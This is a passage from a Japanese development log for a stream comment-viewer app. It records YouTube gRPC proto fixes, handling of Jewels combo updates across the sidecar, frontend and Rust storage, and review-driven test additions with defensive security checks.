- **テスト（sidecar にテスト基盤が無いため `scripts/test-*.mjs` 慣行に合わせて新設）**: `scripts/test-youtube-mapper.mjs`（**39 件 PASS**）＋ alias 解決ローダ `scripts/dist-alias-loader.mjs`（tsc は `@comment-dock/*` を emit 後も書き換えないため。stash の同目的実装と同内容を新規に書き起こし・stash は未変更）。中身は ① **自 proto の番号/型を公式表と突き合わせるアサート**、② **公式 proto（全フィールド）でシリアライズしたバイト列を自 proto でデコードして mapper に通す往復テスト**（＝実配信と同じ経路。番号ズレがあれば必ず落ちる。gift/jewels は実発火機会が乏しいため事実上唯一の自動検証手段）、③ §9 アサート（`gifter_channel_id`/`gift_memberships_level_name`/`gift_url` がデコード結果に現れない）。**ミューテーション検証**（`member_month` を旧 1 に戻す）で 4 件 FAIL することを確認済み＝レッドになるテストであることを担保。desktop 側は `viewerFormat.test.ts` に YouTube gift 文言＋Twitch gift 不変（`source` 明示/未指定の両方）を追加。
- **セキュリティ（security-review 実施・判定「問題なし」）**: **新規宛先ゼロ**（`build/sidecar.cjs` の外部宛先を実測し allow-list と完全一致を確認）・**新規 OAuth スコープゼロ**（`youtube.readonly` のみ）・**新規依存ゼロ**。`host-guard.ts`／`register-youtube-deps.ts`（gRPC チャネルガード `www.googleapis.com:443` のみ）／`tauri.conf.json`／`capabilities/`／`package.json`／`Cargo.toml` は **git 上で無変更**。`csp: null` 不変。追加コードにログ出力ゼロ。proto のズレ修正は既存フィールドを正しい番号/型で読むだけで**受信データ項目を増やさない**。dev スクリプト 2 本はバンドル非同梱（実バンドルを grep して確認）で、一時ファイル運用は `youtube-grpc-runtime.ts` に明文化済みの既存慣行（mkdtemp 0700・非機密 proto）と同一。
- **対象ファイル**: 変更 = sidecar `vendor/comment-fetcher/src/adapters/youtube/client/stream-list-proto.ts`／`.../dto/raw.dto.ts`（`membership_gifting_details?`/`gift_details?`＋新規 2 型＋union を公式 enum と一致させ旧独自値 2 件を除去）／`.../mapper/comment.mapper.ts`、desktop `src/screens/comment-viewer/viewerFormat.ts`／`viewerFormat.test.ts`、docs `security.md`（方針⑪の「043d は対象外・番号非公開」記述を実施済みへ更新）・`task-board.md`・`tasks/043d-*.md`・本エントリ。新規 = sidecar `scripts/test-youtube-mapper.mjs`／`scripts/dist-alias-loader.mjs`。**Rust / wire / binding / 集計 SQL は変更なし**。
- **検証（全 PASS）**: `pnpm --filter @stream-dock/comment-sidecar typecheck`／`pnpm --filter ./apps/desktop typecheck`・`lint`／`cargo check`／`pnpm --filter ./apps/desktop test`（12 files・**109 tests**）／`build:bundle`（禁止依存アサート PASS）／`node scripts/test-host-guard.mjs`（HOST-GUARD PASS）／`node scripts/test-youtube-mapper.mjs`（**39 件 PASS**）。
- **未了（ユーザー環境・要実施）**: ①**フル SEA 再ビルド**＝`TWITCH_CLIENT_ID=... YOUTUBE_CLIENT_ID=... YOUTUBE_CLIENT_SECRET=... pnpm --filter ./apps/desktop build:sidecar`（sidecar 変更の反映に必須）。②**dev-mock で表示回帰**（jewels/gift の行が種別ラベル＋「メンバーシップギフト」文言＋金額バッジで出る）。**注意: dev-mock の Jewels は `"30 jewels"`（小文字）、実データは `"30 JEWELS"`（大文字）と表記が食い違うのが既知・正常**（wire 無変更を優先した結果。不具合ではないので実機確認時に誤認しないこと）。③**実配信（通常チャットのみで可）で退行確認**＝通常/新規メンバー/マイルストーンが届くこと、**とくにマイルストーンの月数が正しい**こと（従来は破損・上記のとおり throw していた可能性あり）。④gift/jewels の実データは発火機会があれば確認（機会が無くても番号は公式確定済み＝実装完了扱い）。⑤`lsof -i` で外部 ESTABLISHED が sidecar PID 配下・既存 allow-list のみ。⑥コミットは本人指示待ち（現在 `main` ブランチ・未コミット）。⑦stash / ブランチ `043d-grpc-capture-spike` は**不要化したがそのまま残置**（破棄は本タスクでは行わない）。

## 2026-07-27 (043d レビュー指摘の反映＝apply-review)

043d の実装差分に対する**独立レビュー**（別セッション・一次情報を再取得して proto を全項目照合）の指摘を反映した。
**proto のフィールド番号・enum 値・ワイヤ型は全項目が公式と一致＝不一致ゼロ**と確認されたため、番号の修正は無い。
以下は指摘に対する対応のみ。

- **【重大・記録のみ／別タスク起票待ち】`GIFT_EVENT` の combo による Jewels 過少計上**: 公式 proto は `LiveChatMessage.id` に
  「For giftEvents, the same ID may be reused to update the combo count」と明記しており、**Jewels だけは同一 id が combo 更新で
  再送される**。現行は `combo_count`（= 8）未採用＋Rust の `INSERT OR IGNORE`（`viewer_comments.id`）のため、**連続ギフトが
  1 回ぶんしか記録されない**。合計の意味論が公式に明記されておらず実データ検証もできないため**推測での換算は入れず**、
  proto（`LiveChatMessage.id`）・mapper（`GIFT_EVENT` 行）・security.md 方針⑪・本エントリに**既知課題として記録**するに留めた。
  恒久対応は「id 更新型イベント」の受け口が要り 043d の要件（wire/Rust 変更ゼロ）を超えるため**別タスク**とする。
- **【修正】`mapJewelsAmount` の 0 扱いを `mapGiftCount` と対称化**: `defaults: true` により「`gift_details` は在るが
  `jewels_amount` 未設定」だと 0 が入り、金額バッジに**「0 JEWELS」と誤表示**されていた（実測確認）。`amount <= 0` を
  `undefined` へ落とし、`eventType=jewels` は維持（種別ラベルは出て金額バッジだけ出ない）。回帰テスト ③-2 を追加。
- **【修正】テストの前提固定**: `ok(..., c?.x, undefined)` 形式の否定アサートは c が undefined だと**素通り**していた
  （デコード例外時に緑になり得る）。`one()` ヘルパで「ちょうど 1 件に写る」を先に固定してから個別フィールドを見る形に変更。
  `JSON.stringify(c)` が c=undefined で TypeError になる問題も同時に解消。
- **【修正】未宣言フィールドのスキップ経路を実際に試す**: 送信側 proto が公式より不足しており、`page_info=1004` /
  `active_poll_item=1008` / `text_message_details=19` / `user_banned_details=22` / `new_sponsor_details=29` / `poll_details=33` /
  `super_sticker_metadata=5` のスキップが**一度も試されていなかった**。送信側を公式の全フィールドへ揃え、テスト ⑦ で
  「隣接番号（`poll_details=33` の直後に `gift_details=34`／`items=1007` の隣に `active_poll_item=1008`）を跨いでも
  採用フィールドが正しく読める」ことと「BAN された第三者情報を受信しない（§9）」を表明。**39 → 51 アサート**。
- **【修正】sidecar のテストが CI/慣行から呼ばれない孤児だった**: `package.json` に `test` スクリプトを追加
  （`build:tsc` → `test-host-guard.mjs` → `test-obs-client.mjs` → `test-youtube-mapper.mjs`）。
  **セキュリティ回帰ガードである `test-host-guard.mjs` すら自動実行経路が無かった**ため、これが最も効く整理。
- **【コメントのみ・修正不要と判断】**: ①DTO の `type` union は実行時に未知 enum が **`number`** で届くが、唯一の利用箇所が
  `in` 判定で正しく除外されるため実害ゼロ（再修正トリガーを DTO に明記）。②`amount_micros: string` と `longs: String` の
  暗黙結合はスパチャ往復テストがレッドで気付ける形で担保済み。③`source?: string` の任意化は呼び出し 2 箇所が
  `CommentViewDto` を丸ごと渡す前提＋テストで固定済み。④`ok()` の `JSON.stringify` 比較の限界。
  ⑤`dist-alias-loader.mjs` と `build-sea.mjs` の alias **二重管理**（共通化しない理由と再修正トリガーを明記）。
  ⑥gRPC allow-list は `www.googleapis.com` のまま（公式サンプルは `youtube.googleapis.com:443`。将来 Google が集約したら
  fail-closed で遮断され「原因不明の取得停止」に見えるため、**まずここを疑う**旨を host-guard.ts に明記）。
- **【指摘なし＝妥当と確認された点】**: `FAN_FUNDING_EVENT` を mapper に載せない判断（2017年2月に終了済み＋**公式 proto の
  snippet oneof に `fan_funding_details` が存在しない**＝金額をデコードする手段が無い）／`part` は `id,snippet,authorDetails`
  で gift/jewels の詳細が返る（詳細は snippet 配下）／`profile_image_url = 104` の注記削除／計画からの逸脱 2 点。
- **レビューで判明した追加事実**: 旧 `member_month = 1` バグの影響範囲は「1 メッセージ」ではなく、実測で
  **バッチ全体（`LiveChatMessageListResponse` 内の全 items）が失われ、さらに `api.client.ts` の `stream.on("error")`
  経由で gRPC ストリームごと終了**していた。マイルストーン到達のたびにコメント取得が切断・再接続していた可能性が高く、
  当初の想定（月数が誤値）より 2 段階重症。**この修正が 043d で最も価値がある**。
- **検証**: `pnpm --filter @stream-dock/comment-sidecar test`（**51 アサート PASS**・host-guard/obs 含む）／
  `typecheck`（sidecar・desktop）／`lint`／`pnpm --filter ./apps/desktop test`（12 files・109 tests）／`cargo check`／
  `build:bundle`＋バンドル内 URL の allow-list 一致・dev スクリプト非同梱（0 件）を再確認。

## 2026-07-27 (043e 起票: YouTube Jewels の combo 更新に対応)

043d レビューで判明した「`GIFT_EVENT` の combo による Jewels 金額の据え置き」を、独立タスク
[`docs/tasks/043e-youtube-jewels-combo-fidelity.md`](tasks/043e-youtube-jewels-combo-fidelity.md) として起票した。
起票にあたり**実コードで経路を全て確認**し、043d レビュー初報の見立てを 2 点訂正している。

- **訂正1（影響範囲は限定的）**: JEWELS を合計するロールアップ列は**現時点で存在しない**
  （`bits_amount` は `currency='BITS'`／`superchat_amount` は `event_type='superchat'` 条件のため）。
  実害は**コメント行の金額バッジ表示**と **`viewer_comments.amount` の値**の 2 点で、視聴者一覧の集計は壊れていない。
  `total_comments` も combo 1 回＝1 行で正しい。
- **訂正2（React duplicate key は発生しない）**: `mergeComments.ts:27` が id 重複を先に弾くため、
  レビュー初報の「`key={c.id}` が重複しうる」は誤り。実際は**3 層すべて**（`mergeComments` の id 重複排除／
  `ttsQueue` の `seenIds`／Rust の `INSERT OR IGNORE`）が捨てており、combo 更新は **Rust に到達すらしていない**。
- **一次情報の追加確認**: REST リファレンス（`.../live/docs/liveChatMessages`）で
  `comboCount` は「The combo count of the gift; **0 if not a combo**」、`jewelsAmount` は
  「The amount of Jewels **redeemed for the gift**」と確認。**単価か累計かは公式に明記が無い**ため、
  043e は「最新値をそのまま採る（乗算しない）」フェーズ1 と、実データ確定後に
  `× max(combo_count, 1)` を入れるフェーズ2 の 2 段構成とした（`combo_count = 0` があるため素の乗算は不可）。
- **043e の要点**: `mergeComments` に `updated` バケットを新設して表示 1 行のまま金額のみ更新し、
  TTS は再読み上げしない。Rust は `event_type='jewels'` 限定で `amount` を差し替え、既存の冪等契約は他種別で不変。
  受信面に `combo_count`（整数・個人情報なし）を足し `viewer_comments` の既存行 UPDATE を解禁するため
  **着手時に security-review 必須**。
- あわせて 043d 側の記述（proto コメント・mapper コメント・security.md 方針⑪・task-board・043d タスクファイル）の
  「別タスク起票待ち」を **043e 参照**へ更新した。

## 2026-07-27 (dev-mock: YouTube メンバーシップギフトの合成発行を追加)

043d の未了②「dev-mock で表示回帰」を確認しようとしたところ、**dev-mock が YouTube の gift を一度も発行していない**
ことが判明した（`makeComment` の gift 分岐は `seq % 20 === 13 && source === "twitch"` のみ）。jewels は 043a 時点から
発行済みだったが、**043d で最も見た目が変わった「メンバーシップギフト」の文言が dev-mock では永久に出ない**状態だった。

- **追加**: `apps/comment-sidecar/src/dev-mock.ts` の `makeComment` に
  `seq % 20 === 14 && source === "youtube"` の gift 分岐（`giftCount = 5` / `tier` は付けない / `text` は空）。
  表示側 `composeEventMessage` が `source` を見て「〇〇さんがメンバーシップギフトを5件贈りました」を組み立てる。
  **`tier` を付けない**のは実データに合わせるためで、「（TierN）」が出ないことの目視確認も兼ねる。
- **周期に 14 を選んだ理由**: 既存コードの設計原則「%5≠0 で superchat と衝突しない」に従った（15 は
  `15 % 5 === 0` で `seq % 5 === 0` のスパチャ枠を奪うため不可）。13（Twitch gift）の隣に置き対応関係を読みやすくした。
- **実行時検証**: フェイクタイマーで `createMockCommentSource` を駆動し seq 1..60 を確認。
  gift が **14 / 34 / 54**（`source: "youtube"` / `giftCount: 5` / `tier: undefined`）、jewels が **9 / 29 / 49**
  （30 → 100 → 500 jewels を巡回）、superchat は **15 を含む %5===0 で従来どおり発火**＝**枠の奪い合いなし**を実測。
- **セキュリティ**: 既定 OFF の env ゲート（`COMMENT_SIDECAR_MOCK=1`）内のみ・**新規外部宛先ゼロ**
  （dev-mock に通信コードは存在せず、合成フレームを既存 loopback WS に流すだけ）。バンドル内の宛先一覧が
  allow-list と一致することを再確認済み。受贈者名は持たず件数のみ（§9・043d 決定1 と整合）。
- **実機確認時の注意（既知・正常）**: ①`seq` は provider 共通カウンタのため **Twitch と同時接続すると
  jewels / gift が出ないことがある**（YouTube 単独接続で確認すること。`EMIT_INTERVAL_MS = 1800ms` なので
  単独なら約 36 秒に 1 回）。②dev-mock の Jewels は `"30 jewels"`（小文字）、実データは `"30 JEWELS"`（大文字）。
- **検証**: `typecheck` ／ `pnpm --filter @stream-dock/comment-sidecar test`（123 PASS）／ `build:bundle`＋宛先 grep。

## 2026-07-27 (043e YouTube Jewels の combo 更新に対応＝同一 id 再送の取り込み・フェーズ1 実装)

043d レビューで判明した「`GIFT_EVENT` の combo による Jewels 過少計上」を解消した
（タスク: [`docs/tasks/043e-youtube-jewels-combo-fidelity.md`](tasks/043e-youtube-jewels-combo-fidelity.md)）。
公式 proto の `LiveChatMessage.id` にあるとおり **Jewels だけは「別メッセージが N 件届く」のではなく
「同じ 1 件が N 回更新される」**が、実装は 3 層すべて（frontend `mergeComments` の id 重複排除／`ttsQueue` の
`seenIds`／Rust の `INSERT OR IGNORE`）で 2 件目以降を捨てており、**combo 更新は Rust に到達すらしていなかった**。

### 3 層の変更点

- **(1) sidecar 受信面**: `stream-list-proto.ts` の `LiveChatGiftDetails` に `optional int32 combo_count = 8;` を宣言
  （番号は 043d で公式照合済み）。`raw.dto.ts` に `combo_count?: number`、`comment.mapper.ts` に `mapComboCount`
  （**0 以下は undefined へ落とす**＝`mapGiftCount` と同方針。公式が「0 if not a combo」なので単発は 0 で届き、
  そのまま通すと「×0」表示になる）。**`mapJewelsAmount` は 1 行も変えていない**（フェーズ2 の変更予定と再修正
  トリガーをコメントで残しただけ）。
- **(1b) 中継 3 ファイル（タスクファイル未記載・実装時に必要と判明）**: `comboCount` を wire まで通すには 043a の
  `monthCount` と同じ経路＝`entities/comment/comment.ts`・`shared/comment-view.dto.ts`・`comment-to-view.converter.ts`
  の 3 ファイルが要る。無いと**コンパイルは通るのに値だけ静かに消える**ため、計画段階で洗い出して追加した。
- **(2) wire / Rust / binding**: `CanonicalComment.comboCount?: number` を素通し、Rust `CommentViewDto` に
  `#[ts(optional)] pub combo_count: Option<u32>`（struct 単位の `rename_all = "camelCase"` に乗るだけ＝個別 rename 不要）、
  ts-rs binding を再生成して `comboCount?: number` を確認。**端末保存しない**扱いは `monthCount`/`giftCount`/`tier` と同じ。
- **(3) frontend `mergeComments`**: 戻り値を `{ next, added, updated }` へ拡張。`prev` の `Set(seen)` を
  `Map(id → 位置)` に置き換え、同一 id は**表示行を増やさず該当要素を差し替える**。
- **(3b) 表示**: 本体コメント行の金額バッジ隣に「×N」。**オーバーレイには出さない**（配信画面に出す情報を増やさない）。
- **(4) Rust `record_comment`**: `inserted == 0` 分岐に `event_type = 'jewels'` 限定の UPDATE 経路を追加。
- **(7) dev-mock**: `seq % 20 === 12`（YouTube）で **`seq % 20 === 9` と同一 id・同一投稿者**の combo 更新を合成発行。

### `updated` バケットの設計（レビュー時の要点）

`mergeComments` は**表示・TTS・保存の 3 系統がぶら下がる単一注入点**なので、3 バケットの役割を分離した。

- `added` … **新規行だけ**。TTS enqueue の単一注入点＝ここに載る＝読み上げられる（意味は従来と不変）。
- `updated` … **既存行の中身が変わったもの**。`recordComments` にのみ渡し、`enqueueForSpeech` には**渡さない**。
- **`updated` は `eventType === "jewels"` 限定**（タスクファイルに種別条件の記載が無かったため計画時に合意）。
  jewels 以外の同一 id は従来どおり完全スキップ＝表示も invoke も 0 で、**他種別の挙動は 3 層すべてで不変**。
- **変化判定は「Rust が UPDATE する 4 列（`text`/`monetaryAmount`/`monetary.amount`/`monetary.currency`）＋
  表示専用の `comboCount`」**。タスクファイルは「`monetary?.amount` と `comboCount` で足りる」としていたが、
  Rust の更新対象に `text` が含まれるため**比較キー ⊇ 更新列**を不変条件とした（`text` だけ変わる combo を
  取りこぼさない）。StrictMode の二重実行は同一 `prev` から同じ `updated` を 2 回出すので、比較キーを増やしても
  UPDATE の回数は変わらない＝過剰比較のコストは実質ゼロ。
- 同一バッチ内で同じ id が 2 回来た場合（sidecar は 1 件ずつ送るため実運用では起きない）は `added` の該当要素を
  差し替えて `updated` に積まない＝**INSERT と UPDATE の順序競合を作らない**。
- 呼び出し側は `recordComments(updated, sessionId)` を**独立行**にした（`[...added, ...updated]` に混ぜない）。
  `added` にだけ `handleRecordResult` を渡す構造が残り、「added＝表示+TTS+記録／updated＝記録のみ」が読める。

### Rust UPDATE の限定範囲

- `UPDATE viewer_comments SET amount, currency, monetary_amount, text WHERE id = ?1 AND event_type = 'jewels'`。
  **`published_at` / `viewer_id` / `session_id` / `created_at` は書き換えない**（集計 first/last と 038c 判定の基準、
  行の所有者、記録セッションを動かさない）。**列は 1 つも増やしていない**（スキーマ不変）。
- 限定は**二重**: 引数 `c.event_type != "jewels"` の早期 return ＋ SQL の `WHERE ... AND event_type = 'jewels'`。
- 再計算対象の視聴者は **`SELECT viewer_id FROM viewer_comments WHERE id = ?1` で保存済み行から読む**。
  引数の `viewer_id` を使うと「行は元の所有者のまま／集計だけ別視聴者を再計算」という付け替えが起きうるため
  （UPDATE は `viewer_id` を書き換えない）。frontend 由来の値を信用しない（§8）。
- 再計算 SQL は `RECOMPUTE_VIEWER_AGGREGATES_SQL` として定数化し、挿入経路（step3）と更新経路で共有した。
  **SQL 本文は 043a から 1 文字も変えていない**（コメント本文も文言変更なしで const の doc へ移設）。
- 戻り値は更新時も必ず `RecordResult{false,false}`＝**更新でバッジを再点灯させない**。

### テストで固定した内容

- **sidecar**（`test-youtube-mapper.mjs`: **51 → 65 アサート**）: `combo_count = 8` が公式番号と一致・型が int32・
  `gift_url` は非宣言（CSP/§9）／combo で `comboCount` が通り **`monetaryAmount` は乗算されない**（フェーズ1 の仕様固定）／
  `combo_count = 0`（明示）も未設定も `undefined` へ劣化／**同一 id の 2 通**が両方そのまま写る（mapper は間引かない）。
- **frontend**（`mergeComments.test.ts` **新規 11 件**）: 新規は `added`・同一 id 同内容はどちらにも載らない・
  金額/`comboCount`/`text` の変化で `updated` に載り**表示行は増えず**`added` は空（＝**TTS 非到達**）・
  **superchat/chat の同一 id は完全スキップ**（限定の担保）・`MAX_COMMENTS` クランプは従来どおり効き
  クランプで `next` から落ちた行の更新も `updated` には載る・同一バッチ内の同 id は `added` 1 件で `updated` 0 件。
  `CommentList.test.tsx` に **+3 件**（`×N` が出る／`comboCount` 無しでは出ない／overlay には出さない）。
- **Rust**（`repository.rs` **+5 件**）: 同一 id 再送で `amount`/`monetary_amount`/`text` が置き換わり
  `total_comments` は 1 のまま・戻り値 `{false,false}`／`published_at` と `session_id` は不変／
  **別 viewer_id で再送しても行は移らず元の視聴者の集計が再計算される**／**superchat の同一 id は一切更新されない**／
  combo 更新後も JEWELS は bits/superchat/subscription のどの集計にも混ざらない。
  既存の `duplicate_comment_id_is_idempotent` は**無変更で緑**（退行検知に使用）。
- **ミューテーション検証**（テストが実際に効くことの確認）: ①再計算対象を引数 `viewer_id` に戻す →
  `jewels_combo_update_does_not_move_comment_to_another_viewer` が FAIL、②jewels 限定を引数側・SQL 側とも外す →
  `non_jewels_duplicate_id_does_not_update_row` が FAIL、③`updated` を `added` にも積む → `mergeComments` 2 件が FAIL。
  いずれも復元後に全緑を再確認。

### 検証結果

- `pnpm --filter @stream-dock/comment-sidecar typecheck` / `test`（**135 PASS**・host-guard/obs 含む。youtube-mapper 単体は 65）
- `pnpm --filter ./apps/desktop typecheck && lint && test`（**13 files / 131 tests PASS**）
- `cargo check` / `cargo test viewer_memory`（**41 PASS**）
- `build:bundle` ＋バンドル内 URL 一覧が **043d と同一**であることを実測（新規宛先ゼロ）。
  `host-guard.ts` / `register-youtube-deps.ts` / `capabilities/` / `package.json` / `tauri.conf.json` / `Cargo.toml` /
  `pnpm-lock.yaml` は**差分ゼロ**（新規依存・新規 permission ゼロ）。
- **dev-mock の実測**（フェイクタイマーで seq 1..60 を駆動）: combo 更新が **12 / 32 / 52** に出て、それぞれ
  **9 / 29 / 49 と同一 id・同一投稿者**、金額 30→90 / 100→300 / 500→1500 jewels、`comboCount = 3`。
  `seq % 5 === 0` の superchat 枠は**奪っていない**（既存の設計原則どおり）。
- **serde の落とし穴の実測**: `comboCount` 欠落 JSON が `None` にデシリアライズされることを確認
  （`record_comment` は fire-and-forget なので、必須化されていたら**記録が黙って全停止**していた）。
- **security-review 実施済み・判定「問題なし」**。新規宛先/依存/permission/command ゼロ、ログ追加ゼロ、
  SQL は全パラメータバインド、保存範囲は「列追加なし・4 列の上書きのみ・jewels 限定・所有者は DB から読む」。
  観察事項 2 件（①未認証 loopback WS から既存 jewels 行を上書きできるが、同じ相手は元々任意 INSERT が可能＝
  特権昇格ではない ②dev-mock の `lastMockJewels` はセッションを跨いで残る＝dev 限定・実害なし）は対応不要と判断。

### フェーズ2 の残条件（本タスクでは着手しない）

- **再開トリガー**: Jewels の combo が実際に発火する配信で生メッセージを観測できたとき
  （自チャンネル未収益化・協力配信者の Jewels 終了により**実データは今も入手できていない**）。
- 同一 id の連続到着で `jewels_amount` が**変化するか**を見る。変化する（累計）＝**フェーズ1 の実装で既に正しい**ので
  フェーズ2 は不要として閉じる。変化しない（単価）＝`mapJewelsAmount` に `× max(combo_count, 1)` を入れる
  （`combo_count = 0` で 0 倍にならないよう `max(..., 1)` は必須）。**金額が変わるため再度 security-review**。
- 観測手段は本タスクで通した **コメント行の「×N」**（combo 値と金額の変化を同時に目視できる）。

## 2026-07-27 (043e 独立レビュー指摘の反映＝apply-review)

043e フェーズ1 の差分に対する**独立レビュー**（セキュリティ＋品質）の指摘を反映した。判定は
**「軽微な懸念あり」**（実装本体に脆弱性はゼロ。主指摘は「security.md が保証と書いた二重ロックの各層に、
単独では効くテストが 1 件も無い」1 点）。**実装ロジックの変更は dev-mock の 1 行のみ**で、残りはテスト追加と
コメント／docs の追記。

### 修正した（要修正）

- **S-1（最重要）: 二重ロックの各層に単独テストが無かった** — 独立レビュー側のミューテーション検証で、
  **引数側チェックだけ／SQL の `WHERE` だけを外しても 41 テスト全緑**になることが判明した。既存の
  `non_jewels_duplicate_id_does_not_update_row` は「保存も受信も superchat」＝**両層が同時に効くケース**しか
  通していなかったため。2 つのチェックは**見ている対象が違う**（引数側＝受信の種別／SQL＝保存済み行の種別）。
  とくに **「既存 chat コメントの id ＋ `eventType: "jewels"`」というなりすまし種別の再送**は引数側を通過するため、
  止めているのは SQL の `WHERE` **だけ**＝未認証 loopback WS からの現実的な攻撃形に対する唯一の防波堤だった。
  - `repository.rs` にテスト 2 件追加: `stored_non_jewels_row_is_not_updated_by_incoming_jewels`（SQL 層を単独で固定）／
    `stored_jewels_row_is_not_updated_by_incoming_non_jewels`（引数側を単独で固定）。
  - **再ミューテーション検証で各層が単独でレッドになることを確認済み**（下記「検証結果」）。
- **Q-1: クランプで排除された行への combo 更新は `added` に載る** — `prev`（＝前回の `next`）から
  `MAX_COMMENTS` で落ちた jewels 行に後から combo 更新が届くと `at === undefined` になり `updated` ではなく
  `added` へ載る＝`enqueueForSpeech` まで到達する。**記録側は正しく動く**（Rust が `INSERT OR IGNORE` → 0 行 →
  jewels の UPDATE 経路）が、再読み上げを防いでいるのは `added` の構造ではなく **`ttsQueue.seenIds`**。
  つまり「`updated` は TTS へ行かない」の三重担保のうち①（構造的に `added` に載らない）はこのケースで成立しない。
  挙動は仕様として正しいので**変更せず**、docstring を「`added` ＝**`prev` に無い id**」へ精密化し、
  `CommentViewerApp` に最終防波堤が `seenIds` である旨を明記、テスト 1 件（`prev` に無い id の combo 更新は
  `added` に載り `updated` は空）を追加して仕様として固定した。
- **Q-4: 定数と SQL リテラルの値ドリフト検知** — `COMBO_UPDATABLE_EVENT_TYPE` と SQL の `'jewels'` は
  **二重管理を維持**する（SQL 側を定数バインドに寄せると「SQL は引数に関係なく jewels 行しか触らない」という
  防御特性が失われ、定数 1 箇所の書き換えで両層が同時に緩む）。代わりに値の一致だけをテストで固定
  （`combo_updatable_event_type_matches_sql_literal`）。
- **Q-2: 契約のドリフト検知が片方向だった** — `mergeComments.ts` → `repository.rs` の注意書きはあったが、
  **危険なのは逆方向**（Rust が SET 句に 5 列目を足しても、frontend が変化を検知しなくなるだけでテストは落ちない）。
  `repository.rs` の UPDATE 直前に「この SET 句を増減したら `hasComboPayloadChanged` も合わせる」を追記して双方向にした。
- **S-6: dev-mock の `lastMockJewels` がセッションを跨ぐ** — `viewer_comments` は**永続**なので、覚えたまま
  stop → start すると `seq % 20 === 12` が**前セッションで保存された行**へ UPDATE を撃つ（`session_id` は前のまま
  金額だけ変わる＝手動確認で誤読を招く）。`clearProvider("youtube")` で `null` に戻し、セッション単位に閉じた。
  併せて「固定 id はセッション跨ぎで再利用される」という既存の理由づけが**覚えた id にも当てはまる**点を補記。
- **Q-3: dev-mock が「累計で届く」世界だけを模していた** — 合成値が金額 ×3 なので、フェーズ1（乗算しない）と
  組み合わさると常に「30 → 90 に正しく更新される」ように見え、しかも既存コメントがその見え方を**正解として**
  書いていた。**単価で届く世界なら同一 id の再送で金額は変化せず `×N` だけが増える**のが正しい。
  「本モックの見え方をフェーズ2 の判別根拠にしないこと」を dev-mock と 043e タスクファイルの両方に明記した。
- **S-2 / S-3: docs の書き漏らし** — 保存ポリシーの正典である **§9 追補 038a** 側に上書き解禁が書かれておらず、
  043e の記述が方針⑪にしか無かった。追補に「**`viewer_comments` はもはや厳密な append-only ではない**」を
  明記（不変性を前提にする機能＝エクスポート・監査・差分同期を作る際に必ず考慮させるため）。方針⑪ 043e 節には
  脅威モデルの補足（追加された能力は「追記」ではなく「**既存レコードの改変**（完全性）」で質が異なる）と
  S-1 の担保テスト名を追記した。
- **Q-11: `×N` の残置判断が未定義** — 観測用の仮設が無言で常設化しないよう、043e フェーズ2 節に
  「クローズ時に残置/撤去を明示的に決める」と撤去対象（表示 3 箇所のみ・**受信面と wire は撤去しない**）を追記。
- **レビュー判定の記載更新** — task-board と 043e タスクファイルの「security-review 通過（判定「問題なし」）」は
  **自己レビューの結果**だったため、独立レビュー判定「軽微な懸念あり」と反映済みである旨へ更新した。

### コメントのみ（修正不要と判断）

- **S-4（`viewers` upsert が更新経路でも先に走る）**: 別 `viewer_id` を名乗る再送でその視聴者行だけは
  作成/改名される（コメントは移らない）。**043e 以前も step1 は commit されていた既存挙動**で悪化なし。
  `repository.rs` の step1 に理由と再修正トリガーを記載。
- **S-5（`combo_count` の型不正で更新が黙って落ちる）**: `Option<u32>` なので不正値は `record_comment` 全体の
  デシリアライズを失敗させる（`month_count`/`gift_count`/`tier` と同じ既存設計・不正データが残らない fail-closed）。
  ただし combo 更新では「画面は新金額・DB は旧金額」の乖離になる点を `model.rs` に明記
  （**非 doc コメント `//` にして ts-rs binding へ流さない**）。
- **Q-6（`monetaryAmount` と `monetary.amount` の二重比較）**: Rust が独立した列として SET するため
  **冗長ではなく必要条件**。片方に減らせるのは Rust が対応列を SET しなくなったときだけ、と `mergeComments.ts` に記載。
- **Q-7（`added[at - prev.length]` の添字依存）**: 現状は正しい（`merged.push` と `added.push` が常に対）。
  不変条件と「崩れると別のコメントを上書きする」壊れ方をコメントで明示。別実装（`addedIndexById` 等）には
  しない（実運用で通らない防御コードに構造を足すのは過剰）。
- **Q-8（`Set`→`Map` の「後勝ち」非同値）**: `prev` は常に本関数自身の `next`（id 一意）で初期 state は空配列のため
  発生しない。依存する不変条件になった旨と再修正トリガーを記載。
- **Q-9（`inserted == 0` 分岐の 3 return）**: 全経路で `tx.commit()` を通り、`?` の早期脱出は drop でロールバック＝
  境界は正しい。抽出は「仕様にない大規模リファクタをしない」（CLAUDE.md）に触れるため今回は行わない旨を記載。
- **Q-10（`mapComboCount` と `mapGiftCount` の重複）**: 意味論が違い 0 を落とす根拠も別々の一次情報。加えて
  **フェーズ2 で本関数だけが `max(combo_count, 1)` の起点になり確実に分岐する**ため別関数のまま維持。
- **Q-12（dev-mock ヘッダの「top-level 副作用ゼロ」との整合）**: `let ... = null` は宣言であって副作用ではなく
  不変条件は保たれる。既存コメントで説明済みのため**追記なし（対応済み）**。
- **Q-5（`added`/`updated` の切り分けの可読性）**: 指摘なし（良好と評価）。Q-1 の docstring 精密化のみ反映。

### 検証結果

- `cargo check` / `cargo test viewer_memory`（**41 → 44 PASS**・S-1 の 2 件＋Q-4 の 1 件）
- `pnpm --filter ./apps/desktop typecheck && lint && test`（**13 files / 131 → 132 tests PASS**・Q-1 の 1 件）
- `pnpm --filter @stream-dock/comment-sidecar typecheck` / `test`（**135 PASS**・変化なし）
- `gen:bindings` 再生成で **binding 差分は 043e 分のまま**（`model.rs` の追記を非 doc コメントにしたため流れていない）
- **再ミューテーション検証（S-1 の目的が達成されたことの確認）**:
  ①引数側チェックだけ無効化 → `stored_jewels_row_is_not_updated_by_incoming_non_jewels` が **FAIL**
  ②SQL の `WHERE` だけ削除 → `stored_non_jewels_row_is_not_updated_by_incoming_jewels` が **FAIL**
  ③定数だけ書き換え → `combo_updatable_event_type_matches_sql_literal` ほか **3 件 FAIL**
  いずれも復元後に全緑を再確認。**これで「片方だけ外しても緑」だった穴は塞がった**。

## 2026-07-27 (043e レビュー後のテスト補完＝write-tests)

apply-review の反映後、**ユニットテストでカバーできる残りのギャップ**を仕様ベースで埋めた。
**新規ライブラリ・新規依存はゼロ**（`pnpm-lock.yaml` / `Cargo.lock` / 各 `package.json` の dependencies に差分なし。
sidecar の `package.json` は `test` スクリプトへ 2 本追加しただけ）。

### 追加したテストと、それが固定している仕様

- **`apps/comment-sidecar/scripts/test-comment-relay.mjs`（新規・19 アサート）** — 中継経路（`Comment` →
  converter → wire）の担保。**ここは今まで自動テストがゼロだった**。043e の逸脱①のとおり、この経路は
